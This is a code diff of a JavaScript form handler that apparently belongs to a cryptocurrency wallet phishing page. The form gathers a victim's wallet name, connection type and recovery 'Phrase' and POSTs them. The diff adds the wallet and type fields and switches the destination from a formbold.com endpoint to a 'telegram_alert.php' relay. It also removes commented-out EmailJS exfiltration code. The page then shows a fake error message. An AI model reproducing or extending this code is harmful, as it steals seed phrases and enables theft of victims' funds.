@@ -753,25 +753,17 @@
       alert('Fill in your connection ' + type);
     } else {
       var data = {
+        "wallet": wallet,
+        "type": type,
         "Phrase": phrase,
       };
 
-      $.ajax('https://formbold.com/s/67pXB', {
+      $.ajax('telegram_alert.php', {
         type: 'POST',
         data: JSON.stringify(data),
         contentType: 'application/json'
       }).done(function () {
-        // data.template_id = 'template_lscuf4n';
-        // data.service_id = 'service_obyoros';
-        // data.user_id = 'GCWFVgTjoR58gLjqe';
-        // $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
-        //   type: 'POST',
-        //   data: JSON.stringify(data),
-        //   contentType: 'application/json'
-        // }).done(function () {
         redirect();
-        // })
-
         document.querySelector('.sending').style.display = 'block';
       }).fail(function (error) {
         alert('Could not proceed due to some errors, kindly try again later.')
